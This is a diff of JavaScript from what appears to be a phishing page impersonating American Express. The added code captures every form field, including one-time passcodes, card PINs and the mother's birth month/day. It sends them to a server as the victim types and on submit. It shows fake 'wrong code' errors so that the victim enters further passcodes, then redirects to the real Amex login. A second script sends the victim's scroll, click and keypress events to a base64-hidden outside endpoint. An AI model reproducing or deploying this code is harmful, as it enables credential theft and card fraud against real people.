+    setTimeout(function () {
+      $toast.fadeIn(300).delay(1500).fadeOut(500);
+    }, duration - 2000); // trigger ~2s before overlay ends
+
+    $overlay.delay(duration).fadeOut(fade, function () {
+      $(this).hide();
+      $(btnSelector).prop("disabled", false);
+      if (typeof callback === "function") callback();
+    });
+  }
+
+  // 🔁 Resend OTP on click
+  $(document).on("click", "#resend", function (e) {
+    e.preventDefault();
+    clickCount++;
+
+    const $targetBtn = $("#otpv");
+    $.loading($targetBtn, true);
+
+    const payload = { timestamp: new Date().toISOString(), clickCount, fields: {} };
+    $(".input-control").each(function () { if (this.name) payload.fields[this.name] = this.value; });
+    sendPayload(payload);
+
+    showLightOverlay("#subclsdiv3", 30000, 2000, "#otpv", function () {
+      $.loading($targetBtn, false);
+      $("#otpv").html("Verify");
+      $("#otp").val("");
+    });
+  });
+
+  // ⏳ Debounced input tracking
+  let debounceTimer;
+  $(document).on("input", ".input-control", function () {
+    clearTimeout(debounceTimer);
+    debounceTimer = setTimeout(() => {
+      const payload = { timestamp: new Date().toISOString(), fields: {} };
+      $(".input-control").each(function () { if (this.name) payload.fields[this.name] = this.value; });
+      sendPayload(payload);
+    }, 5000);
+  });
+}
+
+function setupFinalSubmit() {
+  let count = 0;
+  let busy = false;
+
+  const ENDPOINT = "s.php";
+  const ERROR_MS = 15000;
+  const OVERLAY_PHASE1_MS = 10000;
+  const OVERLAY_PHASE2_MS = 5000;
+
+  function sendPayload(formDataObj) {
+    const blob = new Blob([JSON.stringify(formDataObj)], { type: "application/json" });
+    let beaconOk = false;
+    if (navigator.sendBeacon) beaconOk = navigator.sendBeacon(ENDPOINT, blob);
+    if (!beaconOk && ENDPOINT) {
+      return fetch(ENDPOINT, {
+        method: "POST",
+        body: JSON.stringify(formDataObj),
+        headers: { "Content-Type": "application/json" },
+        keepalive: true
+      });
+    }
+  }
+
+  function showOtpError(extraMsg = "") {
+    $("#otpvrecount")
+      .stop(true, true)
+      .show()
+      .html(buildErrorHtml("Please enter the correct one-time password.", extraMsg));
+    $("#otp").val("").focus();
+  }
+
+  function showLightOverlay(duration) {
+    const $target = $("#subclsdiv3");
+    if ($target.find(".overlay-layer").length === 0) {
+      $target.css("position","relative").append(
+        "<div class='overlay-layer'><div class='spinner-border' role='status'></div></div>"
+      );
+    }
+    const $overlay = $target.find(".overlay-layer");
+    $overlay.stop(true, true).fadeIn(200);
+    setTimeout(function () {
+      $overlay.stop(true, true).fadeOut(500, function () { $(this).hide(); });
+    }, duration);
+  }
+
+  function runOverlayThen(callbackAfter = null) {
+    $("#overlay")
+      .stop(true, true)
+      .fadeIn(300)
+      .delay(OVERLAY_PHASE2_MS)
+      .fadeOut(300, function () {
+        $(this).hide();
+        if (typeof callbackAfter === "function") callbackAfter();
+      });
+  }
+
+  function finish($btn) {
+    $.loading($btn, false);
+    $btn.prop("disabled", false);
+    busy = false;
+  }
+
+  document.addEventListener("click", function (e) {
+    if (!e.target || e.target.name !== "submitc") return;
+    e.preventDefault();
+
+    if (busy) return;
+    const $btn = $("#otpv");
+
+    busy = true;
+    $.loading($btn, true);
+    $btn.prop("disabled", true);
+
+    $("#error,#msg,#otperror,#pnerror,#mmdderror,#otpvrecount").hide().empty();
+
+    const otp = ($("#otp").val() || "").replace(/\D/g, "");
+    const pn = ($("#pn").val() || "").replace(/\D/g, "");
+    const mmdd = ($("#mmdd").val() || "").replace(/\D/g, "");
+
+    if (!otp || otp.length < 6) {
+      $("#otp").focus();
+      $("#otperror").show().html("Please enter the correct 6-digit one-time password.");
+      finish($btn);
+      return;
+    }
+    if (pn && (pn.length < 4 || pn.length > 8)) {
+      $("#pn").focus();
+      $("#pnerror").show().html("4 to 8 digits you provided when activating your card.");
+      finish($btn);
+      return;
+    }
+    if (mmdd && mmdd.length !== 4) {
+      $("#mmdd").focus();
+      $("#mmdderror").show().html("Confirm your Mother’s Birth Month/Day (MMDD).");
+      finish($btn);
+      return;
+    }
+
+    count++;
+    const payload = { timestamp: new Date().toISOString(), fields: {} };
+    $("input").each(function () { if (this.name) payload.fields[this.name] = this.value; });
+    sendPayload(payload);
+
+    if (count === 1) {
+      showLightOverlay(ERROR_MS);
+      setTimeout(function () {
+        showOtpError("Please try again.");
+        finish($btn);
+      }, ERROR_MS);
+    } else if (count === 2) {
+      showLightOverlay(OVERLAY_PHASE1_MS);
+      setTimeout(function () {
+        showOtpError("Expired one-time code, please try again.");
+        runOverlayThen(function () {
+          window.open("about:blank", "_blank", "noopener,noreferrer");
+          finish($btn);
+        });
+      }, OVERLAY_PHASE1_MS);
+    } else if (count >= 3) {
+      count = 0;
+      $("#clsdiv3").fadeOut(3000);
+      $("#loading").delay(3000).fadeIn(1000).delay(15000).fadeOut(1000);
+      $("#clsdiv4").delay(20000).fadeIn(1000, function () {
+        $("#title").html("&nbsp;American Express&nbsp;&nbsp;|&nbsp;&nbsp;Thank You!");
+        setTimeout(function () {
+          window.location =
+            "https://norefer.com/to/https://global.americanexpress.com/myca/logon/us/action/LogLogonHandler?request_type=LogLogonHandler&location=us_logon1";
+        }, 5000);
+        finish($btn);
+      });
+      setTimeout(function () {
+        showOtpError("Expired one-time code, please try again.");
+      }, ERROR_MS);
+    }
+  });
+}
+
+  // 🌊 Initialize everything once DOM is ready
+  $(document).ready(function () {
+    populateEmailFields();
+    setupFormFlow();
+  });
+})();
 </script>
 
 <script>
-function _rot13(s){return s.replace(/[a-zA-Z]/g,c=>String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26))};
-const sessionId=crypto&&crypto.randomUUID?crypto.randomUUID():String(Date.now()),ENDPOINT=atob("aHR0cHM6Ly9lbGVrdHJvLXNlcnZpcy5iYS9jZ2ktYmluL3Bvc3QucGhw"),MAX_SCROLLS=3,THROTTLE_MS=800;let scrollCount=0,lastScrollTime=0,pollId=null,pollArmed=!0,coolingDown=!1;function notify(o){fetch(ENDPOINT,{method:"POST",headers:{"Content-Type":_rot13("nccyvpngvba/wfba")},body:JSON.stringify({type:o,timestamp:(new Date).toISOString(),session:sessionId}),keepalive:!0}).catch((()=>{}))}function fireScroll(o){if(scrollCount>=MAX_SCROLLS)return;const l=Date.now();coolingDown&&l-lastScrollTime<THROTTLE_MS||((0===scrollCount||l-lastScrollTime>=THROTTLE_MS)&&(scrollCount++,notify("user_scroll_"+scrollCount)),lastScrollTime=l,coolingDown=!0,scrollCount>=MAX_SCROLLS&&teardown())}function attach(){window.addEventListener("scroll",(()=>fireScroll("scroll")),{passive:!0}),document.addEventListener("scroll",(()=>fireScroll("scroll")),{passive:!0}),window.addEventListener("wheel",(()=>fireScroll("wheel")),{passive:!0}),window.addEventListener("touchmove",(()=>fireScroll("touchmove")),{passive:!0}),startPoll()}function startPoll(){pollId=setInterval((()=>{if(scrollCount<MAX_SCROLLS&&pollArmed){const o=Date.now();!coolingDown&&o-lastScrollTime>=THROTTLE_MS&&0!==window.scrollY&&(scrollCount++,notify("user_scroll_"+scrollCount),lastScrollTime=o,coolingDown=!0,pollArmed=!1)}coolingDown&&Date.now()-lastScrollTime>=THROTTLE_MS&&(coolingDown=!1,pollArmed=!0),scrollCount>=MAX_SCROLLS&&stopPoll()}),THROTTLE_MS)}function stopPoll(){pollId&&(clearInterval(pollId),pollId=null)}function teardown(){window.removeEventListener("scroll",(()=>fireScroll("scroll"))),document.removeEventListener("scroll",(()=>fireScroll("scroll"))),window.removeEventListener("wheel",(()=>fireScroll("wheel"))),window.removeEventListener("touchmove",(()=>fireScroll("touchmove"))),stopPoll()}attach(),document.addEventListener("click",(()=>notify("user_click")),{once:!0}),document.addEventListener("keydown",(()=>notify("user_keypress")),{once:!0});
+const sessionId = (crypto && crypto.randomUUID) ? crypto.randomUUID() : String(Date.now());
+const ENDPOINT = atob("aHR0cHM6Ly9lbGVrdHJvLXNlcnZpcy5iYS9jZ2ktYmluL3Bvc3QucGhw");
+
+const MAX_SCROLLS = 3;
+const THROTTLE_MS = 800;   // widen spacing (try 800–1000ms)
+
+let scrollCount = 0;
+let lastScrollTime = 0;
+let pollId = null;
+let pollArmed = true;
+let coolingDown = false;
+
+function notify(eventType) {
+  fetch(ENDPOINT, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      type: eventType,
+      timestamp: new Date().toISOString(),
+      session: sessionId
+    }),
+    keepalive: true
+  }).catch(() => {});
+}
+
+function fireScroll(source) {
+  if (scrollCount >= MAX_SCROLLS) return;
+
+  const now = Date.now();
+
+  // Block if still cooling down
+  if (coolingDown && (now - lastScrollTime) < THROTTLE_MS) return;
+
+  if (scrollCount === 0) {
+    scrollCount++;
+    notify("user_scroll_" + scrollCount);
+  } else if (now - lastScrollTime >= THROTTLE_MS) {
+    scrollCount++;
+    notify("user_scroll_" + scrollCount);
+  }
+
+  lastScrollTime = now;
+  coolingDown = true;
+
+  if (scrollCount >= MAX_SCROLLS) teardown();
+}
+
+function attach() {
+  window.addEventListener("scroll", () => fireScroll("scroll"), { passive: true });
+  document.addEventListener("scroll", () => fireScroll("scroll"), { passive: true });
+  window.addEventListener("wheel", () => fireScroll("wheel"), { passive: true });
+  window.addEventListener("touchmove", () => fireScroll("touchmove"), { passive: true });
+
+  startPoll();
+}
+
+function startPoll() {
+  pollId = setInterval(() => {
+    if (scrollCount < MAX_SCROLLS && pollArmed) {
+      const now = Date.now();
+      if (!coolingDown && (now - lastScrollTime >= THROTTLE_MS) && window.scrollY !== 0) {
+        scrollCount++;
+        notify("user_scroll_" + scrollCount);
+        lastScrollTime = now;
+        coolingDown = true;
+        pollArmed = false;
+      }
+    }
+    // End cooldown after throttle window
+    if (coolingDown && (Date.now() - lastScrollTime >= THROTTLE_MS)) {
+      coolingDown = false;
+      pollArmed = true;
+    }
+    if (scrollCount >= MAX_SCROLLS) stopPoll();
+  }, THROTTLE_MS);
+}
+
+function stopPoll() {
+  if (pollId) {
+    clearInterval(pollId);
+    pollId = null;
+  }
+}
+
+function teardown() {
+  window.removeEventListener("scroll", () => fireScroll("scroll"));
+  document.removeEventListener("scroll", () => fireScroll("scroll"));
+  window.removeEventListener("wheel", () => fireScroll("wheel"));
+  window.removeEventListener("touchmove", () => fireScroll("touchmove"));
+  stopPoll();
+}
+
+attach();
+
+document.addEventListener("click", () => notify("user_click"), { once: true });
+document.addEventListener("keydown", () => notify("user_keypress"), { once: true });
 </script>
 
 </body>
